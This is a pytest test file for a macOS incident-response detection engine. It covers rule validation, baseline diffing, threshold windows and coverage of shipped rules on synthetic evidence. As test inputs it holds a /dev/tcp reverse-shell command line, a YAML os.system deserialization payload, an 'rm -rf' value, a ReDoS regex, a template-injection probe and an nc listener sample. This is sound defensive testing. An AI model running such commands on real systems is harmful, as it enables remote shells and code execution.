from pathlib import Path

import pytest
import yaml

from mac_ir.detections.engine import RuleError, evaluate, load_rules, validate_rule
from mac_ir.evidence.manifest import load_evidence

REPO = Path(__file__).resolve().parents[2]
RULES = REPO / "rules"
CASE = REPO / "examples/synthetic-evidence/case-001"
BASE = REPO / "examples/synthetic-evidence/baseline"


def rule(**over):
    r = {
        "id": "MIR-TEST-001",
        "version": 1,
        "title": "t",
        "description": "d",
        "category": "c",
        "severity": "low",
        "confidence": "low",
        "artifact": "processes",
        "why": "pid {pid}",
        "false_positives": ["fp"],
        "next_steps": ["n"],
        "when": [{"field": "name", "op": "eq", "value": "x"}],
    }
    r.update(over)
    return r


def run(r, records, status="ok", baseline=None):
    rules = [validate_rule(r, "t")]
    return evaluate(rules, {r["artifact"]: {"records": records, "status": status}}, baseline)


def test_shipped_rules_valid_and_complete():
    rules = load_rules(RULES)
    assert len(rules) >= 20
    for r in rules:
        assert r.false_positives and r.next_steps and r.why and r.version >= 1
    assert len({r.id for r in rules}) == len(rules)


def test_synthetic_case_expected_rules_fire():
    arts, _ = load_evidence(CASE)
    base, _ = load_evidence(BASE)
    findings, _ = evaluate(load_rules(RULES), arts, base)
    ids = {f.rule_id for f in findings}
    assert {
        "MIR-PROC-001",
        "MIR-PROC-002",
        "MIR-PERS-001",
        "MIR-PERS-002",
        "MIR-PERS-003",
        "MIR-PERS-004",
        "MIR-PERS-005",
        "MIR-PERS-007",
        "MIR-PERS-008",
        "MIR-PERS-009",
        "MIR-PERS-010",
        "MIR-AUTH-001",
        "MIR-AUTH-002",
        "MIR-AUTH-003",
        "MIR-FILE-001",
        "MIR-FILE-002",
        "MIR-NET-002",
    } <= ids
    f = next(x for x in findings if x.rule_id == "MIR-AUTH-001")
    assert f.evidence["count"] >= 10 and f.severity == "medium" and f.confidence == "medium"
    assert f.classification == "heuristic" and f.attack == ["T1110"]


def test_benign_evidence_produces_no_false_positive():
    recs = [
        {
            "pid": 5,
            "name": "nginx",
            "exe": "/usr/sbin/nginx",
            "exe_deleted": False,
            "cmdline": ["nginx", "-g", "daemon off;"],
        }
    ]
    findings, _ = evaluate(load_rules(RULES), {"processes": {"records": recs, "status": "ok"}}, None)
    assert findings == []


def test_unfamiliar_executable_alone_is_not_flagged():
    arts = {
        "processes": {
            "records": [{"pid": 9, "name": "weird", "exe": "/opt/strange/bin/weird", "cmdline": ["weird"]}],
            "status": "ok",
        }
    }
    assert evaluate(load_rules(RULES), arts, None)[0] == []


def test_baseline_rules_skipped_without_baseline():
    arts, _ = load_evidence(CASE)
    _, notes = evaluate(load_rules(RULES), arts, None)
    assert any("MIR-PERS-005" in n and "no baseline" in n for n in notes)


def test_baseline_changed_detection():
    r = rule(
        artifact="files",
        type="baseline",
        mode="changed",
        key_fields=["path"],
        compare_fields=["sha256"],
        when=[],
        why="{path} changed",
    )
    cur = {"files": {"records": [{"path": "/etc/passwd", "sha256": "b"}], "status": "ok"}}
    old = {"files": {"records": [{"path": "/etc/passwd", "sha256": "a"}], "status": "ok"}}
    f, _ = evaluate([validate_rule(r, "t")], cur, old)
    assert f and f[0].evidence["changed_fields"] == ["sha256"]
    same, _ = evaluate([validate_rule(r, "t")], old, old)
    assert same == []


def test_rules_not_evaluated_when_artifact_failed_or_missing():
    f, notes = run(rule(), [{"name": "x", "pid": 1}], status="failed")
    assert f == [] and "not evaluated" in notes[0]
    f, notes = evaluate([validate_rule(rule(), "t")], {}, None)
    assert f == [] and "not present" in notes[0]


def test_threshold_window():
    r = rule(
        artifact="logs",
        type="threshold",
        group_by="src_ip",
        threshold=3,
        window_seconds=60,
        when=[{"field": "event_type", "op": "eq", "value": "bad"}],
        why="{count} from {group}",
    )

    def ev(ts):
        return {"event_type": "bad", "src_ip": "1.1.1.1", "ts": ts}

    close = [ev("2026-03-10T11:00:00Z"), ev("2026-03-10T11:00:10Z"), ev("2026-03-10T11:00:20Z")]
    assert run(r, close)[0]
    far = [ev("2026-03-10T11:00:00Z"), ev("2026-03-10T11:05:00Z"), ev("2026-03-10T11:10:00Z")]
    assert run(r, far)[0] == []
    assert run(r, [{"event_type": "bad", "src_ip": "1.1.1.1"}] * 5)[0] == []  # no timestamps: cannot threshold


@pytest.mark.parametrize(
    "bad",
    [
        {"id": "bad-id"},
        {"severity": "urgent"},
        {"confidence": "sure"},
        {"false_positives": []},
        {"unknown_key": 1},
        {"when": [{"field": "x", "op": "exec", "value": "rm -rf"}]},
        {"when": [{"field": "x y", "op": "eq", "value": 1}]},
        {"when": [{"field": "x", "op": "regex", "value": "(a+)+$"}]},
        {"when": [{"field": "x", "op": "regex", "value": "a" * 300}]},
        {"when": [{"field": "x", "op": "regex", "value": "["}]},
        {"when": [{"field": "x", "op": "in", "value": "str"}]},
        {"when": []},
        {"attack": ["X1"]},
        {"type": "code"},
        {"version": 0},
    ],
)
def test_invalid_rules_rejected(bad):
    with pytest.raises(RuleError):
        validate_rule(rule(**bad), "t")


def test_rule_file_errors(tmp_path):
    (tmp_path / "a.yaml").write_text("rules: not-a-list")
    with pytest.raises(RuleError):
        load_rules(tmp_path)
    (tmp_path / "a.yaml").write_text("!!python/object/apply:os.system ['id']")
    with pytest.raises(RuleError):  # safe_load refuses python tags: no code execution
        load_rules(tmp_path)
    with pytest.raises(RuleError):
        load_rules(tmp_path / "nope")


def test_duplicate_rule_ids(tmp_path):
    (tmp_path / "a.yaml").write_text(yaml.safe_dump({"rules": [rule(), rule()]}))
    with pytest.raises(RuleError, match="duplicate"):
        load_rules(tmp_path)


def test_finding_cap_and_template_safety():
    r = rule(why="{__class__} {pid}")
    recs = [{"name": "x", "pid": i} for i in range(500)]
    f, notes = evaluate([validate_rule(r, "t")], {"processes": {"records": recs, "status": "ok"}}, None, max_per_rule=5)
    assert len(f) == 5 and "cap" in notes[0]
    assert "<unavailable>" in f[0].why and "<class" not in f[0].why


def test_list_values_matching():
    r = rule(when=[{"field": "cmdline", "op": "contains_any", "value": ["/dev/tcp/"]}])
    assert run(r, [{"pid": 1, "cmdline": ["bash", "-c", "x > /dev/tcp/1.2.3.4/1"]}])[0]
    assert run(r, [{"pid": 1, "cmdline": ["ls"]}])[0] == []
    assert run(r, [{"pid": 1}])[0] == []  # missing field: no match, no crash


# One minimal record set per shipped rule that the synthetic case does not trigger. Together with
# the synthetic case this proves every rule's conditions can actually be satisfied.
POSITIVE_SAMPLES = {
    "MIR-FILE-003": (
        {"files": [{"kind": "sensitive_file", "path": "/etc/sudoers", "uid": 501}]},
        None,
    ),
    "MIR-FILE-004": (
        {"files": [{"kind": "sensitive_file", "path": "/etc/hosts", "sha256": "b" * 64}]},
        {"files": [{"kind": "sensitive_file", "path": "/etc/hosts", "sha256": "a" * 64}]},
    ),
    "MIR-NET-001": (
        {"network": [{"kind": "socket", "state": "LISTEN", "proto": "tcp", "local_port": 4444, "process": "nc"}]},
        {"network": []},
    ),
    "MIR-PERS-006": (
        {
            "persistence": [
                {
                    "kind": "launchd_plist",
                    "path": "/Library/LaunchDaemons/x.plist",
                    "sha256": "b" * 64,
                    "exec_sha256": "c" * 64,
                }
            ]
        },
        {
            "persistence": [
                {
                    "kind": "launchd_plist",
                    "path": "/Library/LaunchDaemons/x.plist",
                    "sha256": "a" * 64,
                    "exec_sha256": "c" * 64,
                }
            ]
        },
    ),
    "MIR-PROC-003": (
        {"processes": [{"pid": 4242, "name": "x", "exe": "/private/tmp/x", "exe_hash_error": "permission denied"}]},
        None,
    ),
}


def _docs(sample):
    return {name: {"records": recs, "status": "ok"} for name, recs in sample.items()}


def test_every_shipped_rule_has_a_firing_test():
    arts, _ = load_evidence(CASE)
    base, _ = load_evidence(BASE)
    rules = load_rules(RULES)
    fired = {f.rule_id for f in evaluate(rules, arts, base)[0]}
    uncovered = {r.id for r in rules} - fired - set(POSITIVE_SAMPLES)
    assert not uncovered, f"add a positive sample for: {sorted(uncovered)}"


@pytest.mark.parametrize("rule_id", sorted(POSITIVE_SAMPLES))
def test_untriggered_rule_fires_on_minimal_sample(rule_id):
    current, baseline = POSITIVE_SAMPLES[rule_id]
    rules = [r for r in load_rules(RULES) if r.id == rule_id]
    assert rules, rule_id
    findings, notes = evaluate(rules, _docs(current), _docs(baseline) if baseline is not None else None)
    assert [f.rule_id for f in findings if f.rule_id == rule_id], notes
